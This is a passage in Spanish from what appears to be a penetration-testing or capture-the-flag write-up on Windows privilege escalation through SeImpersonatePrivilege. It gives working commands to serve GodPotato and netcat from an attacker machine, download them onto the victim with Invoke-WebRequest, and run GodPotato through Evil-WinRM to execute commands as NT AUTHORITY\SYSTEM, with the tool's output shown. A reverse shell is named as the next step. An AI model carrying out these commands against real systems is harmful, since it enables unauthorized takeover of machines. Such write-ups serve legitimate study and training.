## Explotación

Con `SeImpersonatePrivilege` identificado y habilitado, podemos pasar a la fase de explotación.

Para este escenario utilizaremos:

- `GodPotato.exe` explotación de `SeImpersonatePrivilege`.
- `nc.exe` recepción de una conexión `reverse shell`.

Ambos binarios deben estar disponibles en la máquina atacante y posteriormente ser transferidos al sistema víctima.

En la máquina atacante levantamos un servidor HTTP desde el directorio donde se encuentran los binarios:

```bash
python3 -m http.server 8000
```
Ahora, desde la máquina víctima descargamos las herramientas:
```
Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPotato.exe"
Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
```

Con los binarios disponibles en la máquina víctima, primero comprobamos que GodPotato puede ejecutar comandos bajo el contexto de NT AUTHORITY\SYSTEM.

Desde Evil-WinRM ejecutamos:
```
*Evil-WinRM* PS C:\Windows\TEMP> .\GodPotato.exe -cmd "cmd /c whoami"
```

Durante la ejecución, GodPotato muestra que encuentra un SYSTEM token y consigue utilizarlo:
```
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 476 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
```

